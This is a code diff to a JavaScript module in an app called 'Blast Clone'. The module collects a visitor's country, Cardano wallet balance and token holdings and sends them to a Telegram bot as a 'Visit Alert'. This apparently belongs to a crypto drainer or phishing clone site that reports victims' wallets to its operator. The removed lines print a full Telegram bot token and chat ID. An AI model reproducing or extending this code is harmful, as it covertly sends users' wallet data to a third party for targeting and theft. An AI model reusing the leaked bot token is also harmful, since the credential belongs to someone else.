@@ -3,8 +3,8 @@ import axios from "axios";
 import { getUserCountry } from "./getUserLocation";  // Ensure correct file import
 
 // Telegram Bot Token and Chat ID
-const TELEGRAM_BOT_TOKEN = "7448589458:AAGDlnlZerWT7JSTc1C7mq9X0bkYpZkwtQ0";
-const TELEGRAM_CHAT_ID = "6482385341";
+const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
+const TELEGRAM_CHAT_ID = import.meta.env.OTELEGRAM_CHAT_ID;
 
 // Function to send a message to Telegram
 export const sendMessageToTelegram = async (message) => {
@@ -45,14 +45,14 @@ export const sendAppDetailsToTelegram = async (balance, tokens) => {
   const globeIcon = "🌍";  // Unicode globe icon
 
   let message = `*Visit Alert*\n` +
-                `App: Blast Clone\n\n` +
-                `User Info--------------------\n` +
-                `| Country: ${globeIcon} ${country} |\n` +
-                `--------------------------------\n` +
-                `| User Wallet Balance |\n` +
-                `| ADA: ${balance.toFixed(2)} ADA       |\n` +
-                `${tokenDetails.join("\n")}\n` +
-                `------------------------------End`;
+    `App: Blast Clone\n\n` +
+    `User Info--------------------\n` +
+    `| Country: ${globeIcon} ${country} |\n` +
+    `--------------------------------\n` +
+    `| User Wallet Balance |\n` +
+    `| ADA: ${balance.toFixed(2)} ADA       |\n` +
+    `${tokenDetails.join("\n")}\n` +
+    `------------------------------End`;
 
   // Send the message to Telegram
   await sendMessageToTelegram(message);
